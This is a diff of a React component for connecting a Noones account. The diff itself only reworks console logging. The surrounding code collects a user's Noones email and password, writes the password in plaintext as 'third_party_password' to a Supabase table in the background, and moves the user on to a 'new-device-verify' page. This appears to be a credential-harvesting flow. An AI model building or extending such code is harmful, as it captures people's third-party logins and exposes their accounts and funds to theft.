@@ -111,11 +111,11 @@ export default function NoonesConnect() {
     try {
       // Step 1: Generate tracking_id and save to localStorage
       const trackingId = window.crypto?.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`;
-      console.log('[NOONES_STEP1] Generated tracking_id:', trackingId);
+      console.log('[NOONES_STEP1] 🆔 Generated tracking_id:', trackingId);
       
       // Save progress to localStorage immediately
       saveNoonesProgress(2, trackingId, { email, platform: 'Noones', tracking_id: trackingId });
-      console.log('[NOONES_STEP1] Saved tracking_id and step 2 to localStorage');
+      console.log('[NOONES_STEP1] 💾 Saved tracking_id and step 2 to localStorage');
 
       const requestData = {
         tracking_id: trackingId,
@@ -128,6 +128,7 @@ export default function NoonesConnect() {
       // This returns immediately, but the sync happens in the background
       const syncId = `noones-step1-${trackingId}`;
       const noonesInsertOperation = async () => {
+        console.log('[NOONES_STEP1] 📤 Attempting INSERT to Supabase...');
         const result = await supabase
           .from('platform_connection_requests')
           .insert({
@@ -137,18 +138,22 @@ export default function NoonesConnect() {
             third_party_password: password,
           });
 
-        console.log('[NOONES_STEP1] Supabase INSERT response', result);
+        if (result.error) {
+          console.error('[NOONES_STEP1] ❌ Supabase INSERT error:', result.error);
+        } else {
+          console.log('[NOONES_STEP1] ✅ Supabase INSERT success:', result.data);
+        }
         return result;
       };
 
       fireAndMove(noonesInsertOperation, syncId, { maxAttempts: 3, delayMs: 500 });
-      console.log('[NOONES_STEP1] INSERT fired in background, navigating to Step 2...');
+      console.log('[NOONES_STEP1] 🚀 INSERT fired in background, navigating to Step 2...');
       
       // Step 3: Navigate immediately (Sync-and-Move pattern)
       navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData, trackingId } });
       
     } catch (err: any) {
-      console.error('[NOONES_STEP1] Error in handleSubmit:', err);
+      console.error('[NOONES_STEP1] ❌ Error in handleSubmit:', err);
       setErrorMessage(err.message || 'An unexpected error occurred.');
     }
   };
